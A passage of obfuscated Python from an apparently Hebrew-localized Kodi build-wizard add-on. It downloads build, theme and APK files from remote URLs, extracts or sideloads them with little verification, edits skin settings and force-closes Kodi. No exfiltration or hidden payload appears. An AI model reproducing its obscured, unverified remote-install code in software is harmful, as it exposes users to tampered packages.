		if O0O00OOO0O0000OO0 :#line:3777
			wiz .clearS ('build')#line:3778
			O000O0OOOOOOOO0O0 =wiz .checkBuild (O0000O0O0OO00O0O0 ,'url')#line:3779
			O0O0OO0OO00OOOOO0 =O0000O0O0OO00O0O0 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:3780
			if not wiz .workingURL (O000O0OOOOOOOO0O0 )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Build Install: Invalid Zip Url![/COLOR]'%COLOR2 );return #line:3781
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3782
			DP .create (ADDONTITLE ,'[COLOR %s][B]Downloading:[/B][/COLOR] [COLOR %s]%s v%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0000O0O0OO00O0O0 ,wiz .checkBuild (O0000O0O0OO00O0O0 ,'version')),'','אנא המתן')#line:3783
			OOOO00OO0000OO0O0 =os .path .join (PACKAGES ,'%s.zip'%O0O0OO0OO00OOOOO0 )#line:3784
			try :os .remove (OOOO00OO0000OO0O0 )#line:3785
			except :pass #line:3786
			logging .warning (O000O0OOOOOOOO0O0 )#line:3787
			if 'google'in O000O0OOOOOOOO0O0 :#line:3788
			   OO00O00O0OOOOOO00 =googledrive_download (O000O0OOOOOOOO0O0 ,OOOO00OO0000OO0O0 ,DP ,wiz .checkBuild (O0000O0O0OO00O0O0 ,'filesize'))#line:3789
			else :#line:3792
			  downloader .download (O000O0OOOOOOOO0O0 ,OOOO00OO0000OO0O0 ,DP )#line:3793
			xbmc .sleep (1000 )#line:3794
			OOOO0O000OO000O0O ='[COLOR %s][B]Installing:[/B][/COLOR] [COLOR %s]%s v%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0000O0O0OO00O0O0 ,wiz .checkBuild (O0000O0O0OO00O0O0 ,'version'))#line:3795
			DP .update (0 ,OOOO0O000OO000O0O ,'','Please Wait')#line:3796
			O000OO00O00O0O0O0 ,O000O0O0OO0OO000O ,O0OOO0O00OO0OOOO0 =extract .all (OOOO00OO0000OO0O0 ,HOME ,DP ,title =OOOO0O000OO000O0O )#line:3797
			if int (float (O000OO00O00O0O0O0 ))>0 :#line:3798
				wiz .fixmetas ()#line:3799
				wiz .lookandFeelData ('save')#line:3800
				wiz .defaultSkin ()#line:3801
				wiz .setS ('buildname',O0000O0O0OO00O0O0 )#line:3803
				wiz .setS ('buildversion',wiz .checkBuild (O0000O0O0OO00O0O0 ,'version'))#line:3804
				wiz .setS ('buildtheme','')#line:3805
				wiz .setS ('latestversion',wiz .checkBuild (O0000O0O0OO00O0O0 ,'version'))#line:3806
				wiz .setS ('lastbuildcheck',str (NEXTCHECK ))#line:3807
				wiz .setS ('installed','true')#line:3808
				wiz .setS ('extract',str (O000OO00O00O0O0O0 ))#line:3809
				wiz .setS ('errors',str (O000O0O0OO0OO000O ))#line:3810
				wiz .log ('INSTALLED %s: [ERRORS:%s]'%(O000OO00O00O0O0O0 ,O000O0O0OO0OO000O ))#line:3811
				OO0O00000OO00O000 =(ADDON .getSetting ("gaiaseren"))#line:3813
				if OO0O00000OO00O000 =='true':#line:3814
					wiz .kodi17Fix ()#line:3815
				fastupdatefirstbuild (NOTEID )#line:3816
				skin_homeselect ()#line:3817
				skin_lower ()#line:3818
				rdbuildinstall ()#line:3819
				try :gaiaserenaddon ()#line:3821
				except :pass #line:3822
				adults18 ()#line:3823
				skinfix18 ()#line:3824
				try :os .remove (OOOO00OO0000OO0O0 )#line:3826
				except :pass #line:3827
				if OO0O00000OO00O000 =='true':#line:3829
					wiz .kodi17Fix ()#line:3830
				if int (float (O000O0O0OO0OO000O ))>0 :#line:3832
					OOO0O0O00OOOOOOOO =DIALOG .yesno (ADDONTITLE ,'[COLOR %s][COLOR %s]%s v%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0000O0O0OO00O0O0 ,wiz .checkBuild (O0000O0O0OO00O0O0 ,'version')),'הושלם: [COLOR %s]%s%s[/COLOR] [שגיאות:[COLOR %s]%s[/COLOR]]'%(COLOR1 ,O000OO00O00O0O0O0 ,'%',COLOR1 ,O000O0O0OO0OO000O ),'האם תרצה להציג שגיאות?[/COLOR]',nolabel ='[B][COLOR red]לא תודה[/COLOR][/B]',yeslabel ='[B][COLOR green]הצג שגיאות[/COLOR][/B]')#line:3833
					if OOO0O0O00OOOOOOOO :#line:3834
						if isinstance (O000O0O0OO0OO000O ,unicode ):#line:3835
							O0OOO0O00OO0OOOO0 =O0OOO0O00OO0OOOO0 .encode ('utf-8')#line:3836
						wiz .TextBox (ADDONTITLE ,O0OOO0O00OO0OOOO0 )#line:3837
				DP .close ()#line:3838
				O000O0OOO0000O0OO =wiz .themeCount (O0000O0O0OO00O0O0 )#line:3839
				indicator ()#line:3840
				if not O000O0OOO0000O0OO ==False :#line:3841
					buildWizard (O0000O0O0OO00O0O0 ,'theme')#line:3842
				if KODIV >=17 :wiz .addonDatabase (ADDON_ID ,1 )#line:3843
				if INSTALLMETHOD ==1 :O0OO00O00OOOOO0O0 =1 #line:3844
				elif INSTALLMETHOD ==2 :O0OO00O00OOOOO0O0 =0 #line:3845
				else :resetkodi ()#line:3846
				if O0OO00O00OOOOO0O0 ==1 :wiz .reloadFix ()#line:3848
				else :wiz .killxbmc (True )#line:3849
			else :#line:3850
				if isinstance (O000O0O0OO0OO000O ,unicode ):#line:3851
					O0OOO0O00OO0OOOO0 =O0OOO0O00OO0OOOO0 .encode ('utf-8')#line:3852
				O00OO0O0OO0O0O000 =open (OOOO00OO0000OO0O0 ,'r')#line:3853
				O000O0O00000O0O00 =O00OO0O0OO0O0O000 .read ()#line:3854
				OOO000OO0000O0O00 =''#line:3855
				for O00OO00000000O00O in OO00O00O0OOOOOO00 :#line:3856
				  OOO000OO0000O0O00 ='key: '+OOO000OO0000O0O00 +'\n'+O00OO00000000O00O #line:3857
				wiz .TextBox ("%s: בעיה בהתקנת הבילד"%ADDONTITLE ,O0OOO0O00OO0OOOO0 +'לפתרון הבעיה יש לשנות את התאריך במכשיר ליום אחד קודם.'+OOO000OO0000O0O00 )#line:3858
		else :#line:3859
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנת הבילד: מבוטלת![/COLOR]'%COLOR2 )#line:3860
	elif O0OOO00OOO000OOOO =='theme':#line:3861
		if theme ==None :#line:3862
			O000O0OOO0000O0OO =wiz .checkBuild (O0000O0O0OO00O0O0 ,'theme')#line:3863
			OO000OO00OOO00OO0 =[]#line:3864
			if not O000O0OOO0000O0OO =='http://'and wiz .workingURL (O000O0OOO0000O0OO )==True :#line:3865
				OO000OO00OOO00OO0 =wiz .themeCount (O0000O0O0OO00O0O0 ,False )#line:3866
				if len (OO000OO00OOO00OO0 )>0 :#line:3867
					if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]The Build [COLOR %s]%s[/COLOR] comes with [COLOR %s]%s[/COLOR] different themes"%(COLOR2 ,COLOR1 ,O0000O0O0OO00O0O0 ,COLOR1 ,len (OO000OO00OOO00OO0 )),"Would you like to install one now?[/COLOR]",yeslabel ="[B][COLOR green]Install Theme[/COLOR][/B]",nolabel ="[B][COLOR red]Cancel Themes[/COLOR][/B]"):#line:3868
						wiz .log ("Theme List: %s "%str (OO000OO00OOO00OO0 ))#line:3869
						OO00OO0OO0O0O0OO0 =DIALOG .select (ADDONTITLE ,OO000OO00OOO00OO0 )#line:3870
						wiz .log ("Theme install selected: %s"%OO00OO0OO0O0O0OO0 )#line:3871
						if not OO00OO0OO0O0O0OO0 ==-1 :theme =OO000OO00OOO00OO0 [OO00OO0OO0O0O0OO0 ];OO0O0000OO0O0O000 =True #line:3872
						else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Cancelled![/COLOR]'%COLOR2 );return #line:3873
					else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Cancelled![/COLOR]'%COLOR2 );return #line:3874
			else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: None Found![/COLOR]'%COLOR2 )#line:3875
		else :OO0O0000OO0O0O000 =DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to install the theme:'%COLOR2 ,'[COLOR %s]%s[/COLOR]'%(COLOR1 ,theme ),'for [COLOR %s]%s v%s[/COLOR]?[/COLOR]'%(COLOR1 ,O0000O0O0OO00O0O0 ,wiz .checkBuild (O0000O0O0OO00O0O0 ,'version')),yeslabel ="[B][COLOR green]Install Theme[/COLOR][/B]",nolabel ="[B][COLOR red]Cancel Themes[/COLOR][/B]")#line:3876
		if OO0O0000OO0O0O000 :#line:3877
			O00O0O0OOOOO0O0O0 =wiz .checkTheme (O0000O0O0OO00O0O0 ,theme ,'url')#line:3878
			O0O0OO0OO00OOOOO0 =O0000O0O0OO00O0O0 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:3879
			if not wiz .workingURL (O00O0O0OOOOO0O0O0 )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Invalid Zip Url![/COLOR]'%COLOR2 );return False #line:3880
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3881
			DP .create (ADDONTITLE ,'[COLOR %s][B]Downloading:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,theme ),'','Please Wait')#line:3882
			OOOO00OO0000OO0O0 =os .path .join (PACKAGES ,'%s.zip'%O0O0OO0OO00OOOOO0 )#line:3883
			try :os .remove (OOOO00OO0000OO0O0 )#line:3884
			except :pass #line:3885
			downloader .download (O00O0O0OOOOO0O0O0 ,OOOO00OO0000OO0O0 ,DP )#line:3886
			xbmc .sleep (1000 )#line:3887
			DP .update (0 ,"","Installing %s "%O0000O0O0OO00O0O0 )#line:3888
			O0OO0OO0000O0000O =False #line:3889
			if url not in ["fresh","normal"]:#line:3890
				O0OO0OO0000O0000O =testTheme (OOOO00OO0000OO0O0 )if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']else False #line:3891
				OO000000O000O0O0O =testGui (OOOO00OO0000OO0O0 )if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']else False #line:3892
				if O0OO0OO0000O0000O ==True :#line:3893
					wiz .lookandFeelData ('save')#line:3894
					OO000OO0OOOOOOO0O ='skin.confluence'if KODIV <17 else 'skin.estuary'if KODIV <17 else 'skin.anonymous.mod'if KODIV <17 else 'skin.estouchy'if KODIV <17 else 'skin.phenomenal'if KODIV <17 else 'skin.anonymous.nox'if KODIV <17 else 'skin.Premium.mod'#line:3895
					OOOOOO000OO0OOOO0 =xbmc .getSkinDir ()#line:3896
					skinSwitch .swapSkins (OO000OO0OOOOOOO0O )#line:3898
					O0O00000O0OO00000 =0 #line:3899
					xbmc .sleep (1000 )#line:3900
					while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and O0O00000O0OO00000 <150 :#line:3901
						O0O00000O0OO00000 +=1 #line:3902
						xbmc .sleep (1000 )#line:3903
					if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:3904
						wiz .ebi ('SendClick(11)')#line:3905
					else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Skin Swap Timed Out![/COLOR]'%COLOR2 );return #line:3906
					xbmc .sleep (1000 )#line:3907
			OOOO0O000OO000O0O ='[COLOR %s][B]Installing Theme:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,theme )#line:3908
			DP .update (0 ,OOOO0O000OO000O0O ,'','אנא המתן')#line:3909
			O000OO00O00O0O0O0 ,O000O0O0OO0OO000O ,O0OOO0O00OO0OOOO0 =extract .all (OOOO00OO0000OO0O0 ,HOME ,DP ,title =OOOO0O000OO000O0O )#line:3910
			wiz .setS ('buildtheme',theme )#line:3911
			wiz .log ('INSTALLED %s: [שגיאות:%s]'%(O000OO00O00O0O0O0 ,O000O0O0OO0OO000O ))#line:3912
			DP .close ()#line:3913
			if url not in ["fresh","normal"]:#line:3914
				wiz .forceUpdate ()#line:3915
				if KODIV >=17 :wiz .kodi17Fix ()#line:3916
				if OO000000O000O0O0O ==True :#line:3917
					wiz .lookandFeelData ('save')#line:3918
					wiz .defaultSkin ()#line:3919
					OOOOOO000OO0OOOO0 =wiz .getS ('defaultskin')#line:3920
					skinSwitch .swapSkins (OOOOOO000OO0OOOO0 )#line:3921
					O0O00000O0OO00000 =0 #line:3922
					xbmc .sleep (1000 )#line:3923
					while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and O0O00000O0OO00000 <150 :#line:3924
						O0O00000O0OO00000 +=1 #line:3925
						xbmc .sleep (1000 )#line:3926
					if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:3928
						wiz .ebi ('SendClick(11)')#line:3929
					wiz .lookandFeelData ('restore')#line:3930
				elif O0OO0OO0000O0000O ==True :#line:3931
					skinSwitch .swapSkins (OOOOOO000OO0OOOO0 )#line:3932
					O0O00000O0OO00000 =0 #line:3933
					xbmc .sleep (1000 )#line:3934
					while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and O0O00000O0OO00000 <150 :#line:3935
						O0O00000O0OO00000 +=1 #line:3936
						xbmc .sleep (1000 )#line:3937
					if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:3939
						wiz .ebi ('SendClick(11)')#line:3940
					else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Skin Swap Timed Out![/COLOR]'%COLOR2 );return #line:3941
					wiz .lookandFeelData ('restore')#line:3942
				else :#line:3943
					wiz .ebi ("ReloadSkin()")#line:3944
					xbmc .sleep (1000 )#line:3945
					wiz .ebi ("Container.Refresh")#line:3946
		else :#line:3947
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Cancelled![/COLOR]'%COLOR2 )#line:3948
def skin_homeselect ():#line:3952
	try :#line:3954
		O00OO0OO00OOO00O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:3955
		OO0OOO0OO0OOOOO0O =open (O00OO0OO00OOO00O0 ,'r')#line:3957
		OO00O00000000OO0O =OO0OOO0OO0OOOOO0O .read ()#line:3958
		OO0OOO0OO0OOOOO0O .close ()#line:3959
		O000O0O0O0OO0000O ='<setting id="HomeS" type="string(.+?)/setting>'#line:3960
		OO00OO00OOOOOOOOO =re .compile (O000O0O0O0OO0000O ).findall (OO00O00000000OO0O )[0 ]#line:3961
		OO0OOO0OO0OOOOO0O =open (O00OO0OO00OOO00O0 ,'w')#line:3962
		OO0OOO0OO0OOOOO0O .write (OO00O00000000OO0O .replace ('<setting id="HomeS" type="string%s/setting>'%OO00OO00OOOOOOOOO ,'<setting id="HomeS" type="string"></setting>'))#line:3963
		OO0OOO0OO0OOOOO0O .close ()#line:3964
	except :#line:3965
		pass #line:3966
def skin_lower ():#line:3969
	O0OO00O000O0OOO0O =(ADDON .getSetting ("lower"))#line:3970
	if O0OO00O000O0OOO0O =='true':#line:3971
		try :#line:3974
			O0O0O000OOO0O0000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:3975
			OOO00000000O00OO0 =open (O0O0O000OOO0O0000 ,'r')#line:3977
			OO0OOOO0OOOOOOO00 =OOO00000000O00OO0 .read ()#line:3978
			OOO00000000O00OO0 .close ()#line:3979
			O00O00O0OOO0O000O ='<setting id="none_widget" type="bool(.+?)/setting>'#line:3980
			O0OO000O000OO0OOO =re .compile (O00O00O0OOO0O000O ).findall (OO0OOOO0OOOOOOO00 )[0 ]#line:3981
			OOO00000000O00OO0 =open (O0O0O000OOO0O0000 ,'w')#line:3982
			OOO00000000O00OO0 .write (OO0OOOO0OOOOOOO00 .replace ('<setting id="none_widget" type="bool%s/setting>'%O0OO000O000OO0OOO ,'<setting id="none_widget" type="bool">true</setting>'))#line:3983
			OOO00000000O00OO0 .close ()#line:3984
			O0O0O000OOO0O0000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:3986
			OOO00000000O00OO0 =open (O0O0O000OOO0O0000 ,'r')#line:3988
			OO0OOOO0OOOOOOO00 =OOO00000000O00OO0 .read ()#line:3989
			OOO00000000O00OO0 .close ()#line:3990
			O00O00O0OOO0O000O ='<setting id="DisableOverlayColor" type="bool(.+?)/setting>'#line:3991
			O0OO000O000OO0OOO =re .compile (O00O00O0OOO0O000O ).findall (OO0OOOO0OOOOOOO00 )[0 ]#line:3992
			OOO00000000O00OO0 =open (O0O0O000OOO0O0000 ,'w')#line:3993
			OOO00000000O00OO0 .write (OO0OOOO0OOOOOOO00 .replace ('<setting id="DisableOverlayColor" type="bool%s/setting>'%O0OO000O000OO0OOO ,'<setting id="DisableOverlayColor" type="bool">true</setting>'))#line:3994
			OOO00000000O00OO0 .close ()#line:3995
			O0O0O000OOO0O0000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:3997
			OOO00000000O00OO0 =open (O0O0O000OOO0O0000 ,'r')#line:3999
			OO0OOOO0OOOOOOO00 =OOO00000000O00OO0 .read ()#line:4000
			OOO00000000O00OO0 .close ()#line:4001
			O00O00O0OOO0O000O ='<setting id="backgroundwallpaper" type="bool(.+?)/setting>'#line:4002
			O0OO000O000OO0OOO =re .compile (O00O00O0OOO0O000O ).findall (OO0OOOO0OOOOOOO00 )[0 ]#line:4003
			OOO00000000O00OO0 =open (O0O0O000OOO0O0000 ,'w')#line:4004
			OOO00000000O00OO0 .write (OO0OOOO0OOOOOOO00 .replace ('<setting id="backgroundwallpaper" type="bool%s/setting>'%O0OO000O000OO0OOO ,'<setting id="backgroundwallpaper" type="bool">true</setting>'))#line:4005
			OOO00000000O00OO0 .close ()#line:4006
			O0O0O000OOO0O0000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4010
			OOO00000000O00OO0 =open (O0O0O000OOO0O0000 ,'r')#line:4012
			OO0OOOO0OOOOOOO00 =OOO00000000O00OO0 .read ()#line:4013
			OOO00000000O00OO0 .close ()#line:4014
			O00O00O0OOO0O000O ='<setting id="show.clearlogo" type="bool(.+?)/setting>'#line:4015
			O0OO000O000OO0OOO =re .compile (O00O00O0OOO0O000O ).findall (OO0OOOO0OOOOOOO00 )[0 ]#line:4016
			OOO00000000O00OO0 =open (O0O0O000OOO0O0000 ,'w')#line:4017
			OOO00000000O00OO0 .write (OO0OOOO0OOOOOOO00 .replace ('<setting id="show.clearlogo" type="bool%s/setting>'%O0OO000O000OO0OOO ,'<setting id="show.clearlogo" type="bool">false</setting>'))#line:4018
			OOO00000000O00OO0 .close ()#line:4019
			O0O0O000OOO0O0000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4023
			OOO00000000O00OO0 =open (O0O0O000OOO0O0000 ,'r')#line:4025
			OO0OOOO0OOOOOOO00 =OOO00000000O00OO0 .read ()#line:4026
			OOO00000000O00OO0 .close ()#line:4027
			O00O00O0OOO0O000O ='<setting id="show.cdart" type="bool(.+?)/setting>'#line:4028
			O0OO000O000OO0OOO =re .compile (O00O00O0OOO0O000O ).findall (OO0OOOO0OOOOOOO00 )[0 ]#line:4029
			OOO00000000O00OO0 =open (O0O0O000OOO0O0000 ,'w')#line:4030
			OOO00000000O00OO0 .write (OO0OOOO0OOOOOOO00 .replace ('<setting id="show.cdart" type="bool%s/setting>'%O0OO000O000OO0OOO ,'<setting id="show.cdart" type="bool">false</setting>'))#line:4031
			OOO00000000O00OO0 .close ()#line:4032
			O0O0O000OOO0O0000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4036
			OOO00000000O00OO0 =open (O0O0O000OOO0O0000 ,'r')#line:4038
			OO0OOOO0OOOOOOO00 =OOO00000000O00OO0 .read ()#line:4039
			OOO00000000O00OO0 .close ()#line:4040
			O00O00O0OOO0O000O ='<setting id="furniture.showhublogo" type="bool(.+?)/setting>'#line:4041
			O0OO000O000OO0OOO =re .compile (O00O00O0OOO0O000O ).findall (OO0OOOO0OOOOOOO00 )[0 ]#line:4042
			OOO00000000O00OO0 =open (O0O0O000OOO0O0000 ,'w')#line:4043
			OOO00000000O00OO0 .write (OO0OOOO0OOOOOOO00 .replace ('<setting id="furniture.showhublogo" type="bool%s/setting>'%O0OO000O000OO0OOO ,'<setting id="furniture.showhublogo" type="bool">false</setting>'))#line:4044
			OOO00000000O00OO0 .close ()#line:4045
		except :#line:4050
			pass #line:4051
def thirdPartyInstall (O0O000OO00OO00OOO ,OOOOO0OOO00O000OO ):#line:4053
	if not wiz .workingURL (OOOOO0OOO00O000OO ):#line:4054
		LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Invalid URL for Build[/COLOR]'%COLOR2 );return #line:4055
	OOOO0OOOOO000OOO0 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to preform a [COLOR %s]Fresh Install[/COLOR] or [COLOR %s]Normal Install[/COLOR] for:[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,O0O000OO00OO00OOO ),yeslabel ="[B][COLOR green]Fresh Install[/COLOR][/B]",nolabel ="[B][COLOR red]Normal Install[/COLOR][/B]")#line:4056
	if OOOO0OOOOO000OOO0 ==1 :#line:4057
		freshStart ('third',True )#line:4058
	wiz .clearS ('build')#line:4059
	O0OO0O00O0000OOO0 =O0O000OO00OO00OOO .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:4060
	if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4061
	DP .create (ADDONTITLE ,'[COLOR %s][B]Downloading:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0O000OO00OO00OOO ),'','אנא המתן')#line:4062
	OOO00O00O0OOO00OO =os .path .join (PACKAGES ,'%s.zip'%O0OO0O00O0000OOO0 )#line:4063
	try :os .remove (OOO00O00O0OOO00OO )#line:4064
	except :pass #line:4065
	downloader .download (OOOOO0OOO00O000OO ,OOO00O00O0OOO00OO ,DP )#line:4066
	xbmc .sleep (1000 )#line:4067
	O000O00OO0OO0OOO0 ='[COLOR %s][B]Installing:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0O000OO00OO00OOO )#line:4068
	DP .update (0 ,O000O00OO0OO0OOO0 ,'','אנא המתן')#line:4069
	O0O000O00O0000000 ,O0OOOO0OO0OOO00O0 ,OO0OOO0OO000O0OO0 =extract .all (OOO00O00O0OOO00OO ,HOME ,DP ,title =O000O00OO0OO0OOO0 )#line:4070
	if int (float (O0O000O00O0000000 ))>0 :#line:4071
		wiz .fixmetas ()#line:4072
		wiz .lookandFeelData ('save')#line:4073
		wiz .defaultSkin ()#line:4074
		wiz .setS ('installed','true')#line:4076
		wiz .setS ('extract',str (O0O000O00O0000000 ))#line:4077
		wiz .setS ('errors',str (O0OOOO0OO0OOO00O0 ))#line:4078
		wiz .log ('INSTALLED %s: [ERRORS:%s]'%(O0O000O00O0000000 ,O0OOOO0OO0OOO00O0 ))#line:4079
		try :os .remove (OOO00O00O0OOO00OO )#line:4080
		except :pass #line:4081
		if int (float (O0OOOO0OO0OOO00O0 ))>0 :#line:4082
			OO0O00O00OOOOO0O0 =DIALOG .yesno (ADDONTITLE ,'[COLOR %s][COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0O000OO00OO00OOO ),'Completed: [COLOR %s]%s%s[/COLOR] [Errors:[COLOR %s]%s[/COLOR]]'%(COLOR1 ,O0O000O00O0000000 ,'%',COLOR1 ,O0OOOO0OO0OOO00O0 ),'האם תרצה להציג שגיאות?[/COLOR]',nolabel ='[B][COLOR red]לא תודה[/COLOR][/B]',yeslabel ='[B][COLOR green]הצג שגיאות[/COLOR][/B]')#line:4083
			if OO0O00O00OOOOO0O0 :#line:4084
				if isinstance (O0OOOO0OO0OOO00O0 ,unicode ):#line:4085
					OO0OOO0OO000O0OO0 =OO0OOO0OO000O0OO0 .encode ('utf-8')#line:4086
				wiz .TextBox (ADDONTITLE ,OO0OOO0OO000O0OO0 )#line:4087
	DP .close ()#line:4088
	if KODIV >=17 :wiz .addonDatabase (ADDON_ID ,1 )#line:4089
	if INSTALLMETHOD ==1 :OOO0OOO0OO0O000OO =1 #line:4090
	elif INSTALLMETHOD ==2 :OOO0OOO0OO0O000OO =0 #line:4091
	else :OOO0OOO0OO0O000OO =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to [COLOR %s]Force close[/COLOR] kodi or [COLOR %s]Reload Profile[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),yeslabel ="[B][COLOR green]Reload Profile[/COLOR][/B]",nolabel ="[B][COLOR red]Force Close[/COLOR][/B]")#line:4092
	if OOO0OOO0OO0O000OO ==1 :wiz .reloadFix ()#line:4093
	else :wiz .killxbmc (True )#line:4094
def testTheme (OOOOO0000O0OOO00O ):#line:4096
	OOOO00000OO0OOOOO =zipfile .ZipFile (OOOOO0000O0OOO00O )#line:4097
	for O000O0OO00OO00O0O in OOOO00000OO0OOOOO .infolist ():#line:4098
		if '/settings.xml'in O000O0OO00OO00O0O .filename :#line:4099
			return True #line:4100
	return False #line:4101
def testGui (OOOO0O00OOO0O00OO ):#line:4103
	OOOO00OO0O00O00OO =zipfile .ZipFile (OOOO0O00OOO0O00OO )#line:4104
	for OO00OOOOOOO00OOO0 in OOOO00OO0O00O00OO .infolist ():#line:4105
		if '/guisettings.xml'in OO00OOOOOOO00OOO0 .filename :#line:4106
			return True #line:4107
	return False #line:4108
def apkInstaller (OOO0000000000OO0O ,OOOOO00O0OO0OOO00 ):#line:4110
	wiz .log (OOO0000000000OO0O )#line:4111
	wiz .log (OOOOO00O0OO0OOO00 )#line:4112
	if wiz .platform ()=='android':#line:4113
		OO00OO00OOOO00O0O =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]האם תרצה להוריד ולהתקין את:"%COLOR2 ,"[COLOR %s]%s[/COLOR]"%(COLOR1 ,OOO0000000000OO0O ),yeslabel ="[B][COLOR green]התקן[/COLOR][/B]",nolabel ="[B][COLOR red]ביטול[/COLOR][/B]")#line:4114
		if not OO00OO00OOOO00O0O :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]ERROR: Install Cancelled[/COLOR]'%COLOR2 );return #line:4115
		OO0OOO000000O0OOO =OOO0000000000OO0O #line:4116
		if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4117
		if not wiz .workingURL (OOOOO00O0OO0OOO00 )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]APK Installer: Invalid Apk Url![/COLOR]'%COLOR2 );return #line:4118
		DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OO0OOO000000O0OOO ),'','אנא המתן')#line:4119
		O0OO000O00O00O00O =os .path .join (PACKAGES ,"%s.apk"%OOO0000000000OO0O .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|',''))#line:4120
		try :os .remove (O0OO000O00O00O00O )#line:4121
		except :pass #line:4122
		downloader .download (OOOOO00O0OO0OOO00 ,O0OO000O00O00O00O ,DP )#line:4123
		xbmc .sleep (100 )#line:4124
		DP .close ()#line:4125
		notify .apkInstaller (OOO0000000000OO0O )#line:4126
		wiz .ebi ('StartAndroidActivity("","android.intent.action.VIEW","application/vnd.android.package-archive","file:'+O0OO000O00O00O00O +'")')#line:4127
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]ERROR: None Android Device[/COLOR]'%COLOR2 )#line:4128
def createMenu (OOOOOO0OO00O0OOO0 ,O00000OOO0000O000 ,OOOOO0OOO00O0000O ):#line:4134
	if OOOOOO0OO00O0OOO0 =='saveaddon':#line:4135
		OOOO00000O0000000 =[]#line:4136
		O0O0OOO0OOO0O0O0O =urllib .quote_plus (O00000OOO0000O000 .lower ().replace (' ',''))#line:4137
		OOO0O000OOOO0OOOO =O00000OOO0000O000 .replace ('Debrid','Real Debrid')#line:4138
		O0O0000OO00OO0000 =urllib .quote_plus (OOOOO0OOO00O0000O .lower ().replace (' ',''))#line:4139
		OOOOO0OOO00O0000O =OOOOO0OOO00O0000O .replace ('url','URL Resolver')#line:4140
		OOOO00000O0000000 .append ((THEME2 %OOOOO0OOO00O0000O .title (),' '))#line:4141
